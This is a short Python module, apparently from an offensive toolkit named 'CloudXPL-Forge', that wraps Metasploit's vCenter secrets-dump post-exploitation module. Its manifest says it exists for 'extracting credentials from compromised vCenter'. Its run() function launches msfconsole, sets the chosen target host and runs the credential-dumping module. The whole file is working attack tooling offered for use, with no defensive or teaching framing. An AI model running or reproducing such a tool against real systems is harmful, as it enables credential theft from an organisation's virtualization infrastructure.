"""CloudXPL-Forge  -  vCenter Secrets Dump (Metasploit Bridge)."""


MANIFEST: dict = {
    "name": "vCenter Secrets Dump (Metasploit Bridge)",
    "mitre": ["T1552"],
    "description": "Bridge to Metasploit post/linux/gather/vcenter_secrets_dump for extracting credentials from compromised vCenter.",
    "references": ["https://www.rapid7.com/db/modules/post/linux/gather/vcenter_secrets_dump/"],
}


import shutil
import subprocess
import sys


def run(args):
    msfconsole = shutil.which("msfconsole")
    if not msfconsole:
        print("[!] msfconsole not found  -  install Metasploit Framework", file=sys.stderr)
        return 1

    target = getattr(args, "target", None) or getattr(args, "vcenter_host", "") or ""
    cmd = [
        msfconsole, "-q", "-x",
        f"use post/linux/gather/vcenter_secrets_dump; "
        + (f"set RHOSTS {target}; " if target else "")
        + "run; exit",
    ]
    if getattr(args, "verbose", False):
        print(f"[*] Running: {' '.join(cmd)}")
    return subprocess.call(cmd)
